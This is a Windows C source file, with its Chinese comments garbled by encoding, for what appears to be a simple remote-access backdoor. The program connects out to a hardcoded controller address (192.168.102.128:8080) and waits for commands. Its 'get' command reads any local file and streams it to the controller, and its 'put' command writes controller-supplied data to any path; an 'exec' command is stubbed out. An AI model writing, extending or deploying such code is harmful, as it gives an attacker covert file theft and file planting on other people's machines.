
#include "stdafx.h"
#include<stdio.h>
#include<stdlib.h>
#include "tlymm.h"
#include "Winsock2.h"

#pragma comment(lib,"ws2_32.lib")


#define BUFFSIZE 8192
sockaddr_in serAddr;
int exec(int sock, const char *cmd){
	return 0;
}
//��ʼ��socket��̻���
void init_socket(){
	
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;
	wVersionRequested = MAKEWORD(1, 1);
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0)
	{
		return;
	}
	if (LOBYTE(wsaData.wVersion) != 1 ||
		HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return;
	}

}
int create_socket(int tcp){
	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET){
		printf("invalid socket !");
		return -1;
	}
	return sock;
}
int tcp_connect(int sock, const char *ip, const char *port){
	
	serAddr.sin_family = AF_INET;
	serAddr.sin_port = htons(atoi(port));
	serAddr.sin_addr.S_un.S_addr = inet_addr(ip);
	if (connect(sock, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
	{     printf("connect error !");
		  closesocket(sock);
		  return -1;
	}
	else{
		return 0;
	}
	
}
int tcp_recv(int sock,char *buf,int len){
	int rc = recv(sock, buf, len, 0);
	if (rc < 0){
		return -1;
	}
	else{
		return rc;
	}
}
int tcp_send(int sock, char *buf, int len){
	int sd = send(sock, buf, len, 0);
	if (sd < 0){
		return -1;
	}
	else{
		return sd;
	}
}
void close_socket(int sock){

	closesocket(sock);
}
void free_socket(){

	WSACleanup();
}

int get(int sock, const char *cmd){
	char srcfile[256] = { 0 };
	char desfile[256] = { 0 };
	sscanf(cmd, "%s %s", srcfile, desfile);
	FILE *p = fopen(srcfile, "rb");
	if (p){
		char buf[256] = { 0 };
		int len = fseek(p, 0, SEEK_END);
		len = ftell(p);
		if (len > 0){
			sprintf(buf, "%s %d", desfile, len);
			tcp_send(sock, buf, strlen(buf));
	
			memset(buf, 0, strlen(buf));
			tcp_recv(sock, buf, sizeof(buf));
			if (strcmp(buf, "OK") == 0){
				char *content = (char*)malloc(len);
				fseek(p, 0, SEEK_SET);
				fread(content, len, 1, p);
				int rc = 0;
				while (rc<len){
					int aa = tcp_send(sock, &content[rc], len - rc);
					rc += aa;
				}
				free(content);
			}
		}
		fclose(p);
		memset(buf, 0, sizeof(buf));
		tcp_send(sock, "success", 7);
		return 0;
	}
	return -1;
}
int put(int sock, const char *cmd){
	char file[256] = { 0 };
	int len = 0;
	sscanf(cmd, "%s %d", file, &len);
	FILE *p = fopen(file, "wb");
	
	if (p&&len){
		char *buf = (char*)malloc(len);
		memset(buf, 0, len);
		tcp_send(sock, "OK", 2);
		int rc = 0;
		while (rc < len){
			int aa = tcp_recv(sock, &buf[rc], len - rc);
			rc += aa;
		}
		fwrite(buf, len, 1, p);
		free(buf);
		fclose(p);
		tcp_send(sock, "success", 7);
		return 0;
	}
	else{
		tcp_send(sock, "fail", 4);
		return -1;
	}
	

}


int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{


	init_socket();//��ʼ��socket������window������Ҫ��ʼ����linux���治��Ҫ
	//����һ��tcp socket
	int sock = create_socket(1);
	printf("%d\n", sock);
	if (sock == -1){
		return 0;
	}

	//���ӵ�Ŀ�������
	int rc = tcp_connect(sock, "192.168.102.128", "8080");
	if (rc == -1){
		return 0;
	}

	char *buf = (char *)malloc(BUFFSIZE);
	
	while (1){
		
		memset(buf, 0, BUFFSIZE);
		int rc = tcp_recv(sock, buf, BUFFSIZE);
		if (rc <= 0){
			break;
		}


		if (strncmp(buf, "exec ", 5) == 0){
			exec(sock, &buf[5]);
		}
		if (strncmp(buf, "ls ", 3) == 0){
			//ls(sock, &buf[3]);
			tcp_send(sock, "ooo0000", 7);
		}
		if (strncmp(buf, "put ", 4) == 0){
			put(sock, &buf[4]);
		}
		if (strncmp(buf, "get ", 4) == 0){
			
			get(sock, &buf[4]);
		}

	}

	free(buf);

	close_socket(sock);
	//�ͷ�socket������linux����Ҫ
	free_socket();
	return 0;
}


